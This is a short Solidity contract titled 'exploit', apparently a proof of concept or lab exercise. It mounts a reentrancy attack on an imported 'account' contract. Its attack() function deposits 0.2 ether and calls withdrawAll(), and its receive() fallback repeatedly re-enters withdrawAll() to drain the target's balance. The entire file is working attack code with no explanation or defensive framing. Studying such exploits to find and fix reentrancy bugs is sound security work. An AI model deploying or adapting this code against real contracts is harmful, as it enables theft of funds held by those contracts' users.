// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

import "./account.sol";

contract exploit {


    address private account_addr;
    receive() external payable {

        if (msg.sender == account_addr) {

            account account_contract = account(account_addr);
            
            if (address(account_contract).balance > 0.2 ether) {    

                account_contract.withdrawAll();
            }
        }
    }

    function set_target_contract(address addr) external {
        account_addr = addr;
    }


    function attack() external {
        account account_contract = account(account_addr);

        account_contract.deposit{value:0.2 ether}();

        account_contract.withdrawAll();

    }
}